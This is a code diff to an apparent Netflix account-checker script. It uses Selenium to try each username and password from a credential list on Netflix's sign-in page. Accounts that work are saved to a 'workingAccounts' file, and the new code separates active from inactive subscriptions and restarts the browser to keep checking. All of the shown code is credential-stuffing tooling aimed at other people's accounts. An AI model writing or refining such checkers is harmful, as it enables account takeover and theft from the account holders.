@@ -42,7 +42,7 @@ def removeLine(file):
         fOut.writelines(data[1:])
 
 
-def netflix():
+def netflix(fileName=0):
     log("launching webdriver for netflix")
     driver = webdriver.Chrome()
     driver.get("https://www.netflix.com/")
@@ -54,9 +54,10 @@ def netflix():
     time.sleep(2)
     signIn.click()
     time.sleep(1)
-    fileTime = datetime.datetime.now()
-    fileName = ("workingAccounts/" + "Netflix_" +
-                fileTime.strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
+    if fileName == 0:
+        fileTime = datetime.datetime.now()
+        fileName = ("workingAccounts/" + "Netflix_" +
+                    fileTime.strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
     credentials = read()
     for acc in credentials:
         try:
@@ -105,21 +106,29 @@ def netflix():
             continue
         except:
             try:
-                WebDriverWait(driver, 5).until(
+                WebDriverWait(driver, 1).until(
                     EC.presence_of_element_located((
                         By.LINK_TEXT, "Sign Out"))
                 )
+                logout = driver.find_element_by_link_text("Sign Out")
+                log("Inactive subscription for " + acc)
+                removeLine('accounts.txt')
+                logout.click()
+                signIn = driver.find_element_by_link_text("Sign In")
+                signIn.click()
             except:
-                log("Could not load")
-                break
-            logout = driver.find_element_by_link_text("Sign Out")
-            log("Password working for " + acc)
-            accLog(acc, fileName)
-            removeLine('accounts.txt')
-            logout.click()
-            #goNow = driver.find_element_by_link_text("Go now")
-            # goNow.click()
-            signIn = driver.find_element_by_link_text("Sign In")
-            signIn.click()
+                try:
+                    WebDriverWait(driver, 5).until(
+                        EC.presence_of_element_located((
+                            By.LINK_TEXT, "Manage Profiles"))
+                    )
+                    log("Password working for " + acc)
+                    accLog(acc, fileName)
+                    removeLine('accounts.txt')
+                except:
+                    log("Could not load")
+                    break
+                driver.close()
+                netflix(fileName)
     driver.close()
     log("closing webdriver")
